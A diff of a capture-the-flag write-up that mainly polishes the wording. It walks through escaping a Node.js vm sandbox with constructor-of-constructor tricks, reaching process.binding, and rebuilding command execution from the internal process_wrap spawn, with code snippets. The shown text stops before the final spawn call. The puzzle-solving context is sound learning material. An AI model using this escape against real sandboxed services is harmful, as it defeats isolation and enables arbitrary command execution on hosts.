@@ -7,13 +7,15 @@ ctf_url: https://www.breizhctf.com/
 Solves: 0 / Points: 400 / Category: Jail
 
 ## Challenge description 
-See challenge source code [here](/assets/calc2.js)
+See [challenge source code](/assets/calc2.js)
+
+The sandbox is implemented using [Node.js `vm` module](https://nodejs.org/api/vm.html)
 
 ## Challenge resolution
 Our goal is to execute a system command to obtain the flag.
 
 ### Step one: Escape from the vm
-To escape from the vm we will use constructor of constructor to create an anonymous function with controlled body.
+To escape from the vm we will use a constructor of constructor to create an anonymous function with controlled body.
 
 This is a simple example using Firefox JS console:
 ```js
@@ -26,8 +28,8 @@ alert(1)
 }"
 ```
 
-Using this technique we can execute code outside vm context.
-Indeed, the this object when it returned by calling constructor is not restricted to log function:
+Using this technique we can execute code outside the vm context.
+Indeed, the `this` object, when it is returned by calling `constructor`, is not restricted to log function:
 ```js
 >> log(this.constructor.constructor('return this')());
 > EOF
@@ -55,42 +57,38 @@ Comparing to the vm context:
 { log: [Function] }
 ```
 
-
 ### Step two: Execute a shell command
-
-The process.mainModule of the script was cleaned so we didn't have access to "require" function:
+The `process.mainModule` of the script was cleaned so we didn't have access to the `require` function:
 ```js
 /* remove mainModule for better security */
 process.mainModule = {};
 ```
 
-However, we identified that the binding function is available on the object returned by the constructor:
+However, we identified that the `binding` function is available on the object returned by the constructor:
 ```js
 > log(this.proc = this.constructor.constructor('return this.process')());
 
 binding: [Function: binding]
 ```
-The binding function allows loading internal modules. 
-Firstly we tried to read the flag from the file using the "fs" module:
+The `binding` function allows loading internal modules. 
+Firstly, we tried to read the flag from the file using the `fs` module:
 ```js
 > log(this.constructor.constructor('return this.process.binding')()('fs')
 ```
 Fail :( 
 
-But we were able to list directories and identify flag's location:
+But we were able to list directories and identify the flag location:
 
 ```js
 > log(this.constructor.constructor('return this.process.binding')()('fs').readdir('/home/guest', {}, "","", function (err, data) {data}));
 ```
 
-After a tip from the challenge author: "you don't have child_process and it exec function, so write it"
+After a tip from the challenge author: "you don't have `child_process` and its `exec` function, so write it"
 
 
-So let's read nodejs source code on Github:
+So let's read [nodejs source code on Github for `child_process`](https://github.com/nodejs/node/blob/master/lib/internal/child_process.js):
 
-https://github.com/nodejs/node/blob/master/lib/internal/child_process.js
-
-The outcome is that the child_process use an internal binding of process_wrap to execute commands by calling the spawn function: 
+The outcome is that the `child_process` uses an internal binding of `process_wrap` to execute commands by calling the `spawn` function:
 
 ```js
 const { Process } = internalBinding('process_wrap');
@@ -109,7 +107,7 @@ child.spawn({
 });
 ```
 
-Hence, we have to create a Process object and call it spawn function to execute system commands:
+Hence, we have to create a `Process` object and call its `spawn` function to execute system commands:
 
 1 - Check if the binding doesn't fail: 
 ```js
@@ -118,14 +116,14 @@ Hence, we have to create a Process object and call it spawn function to execute 
 { Process: [Function: Process] }
 
 ```
-2 - Instantiate a Process object:
+2 - Instantiate a `Process` object:
 ```js
 > log(this.proc_wrap = this.constructor.constructor('return this.process.binding')());
 > log(this.Process = this.proc_wrap('process_wrap').Process);
 > log(this.process = new Process());
 ```
 
-3 - Call the spawn function with the good parameters:
+3 - Call the `spawn` function with the good parameters:
 
 ```js
 > log(this.env = this.constructor.constructor('return this.process.env')());
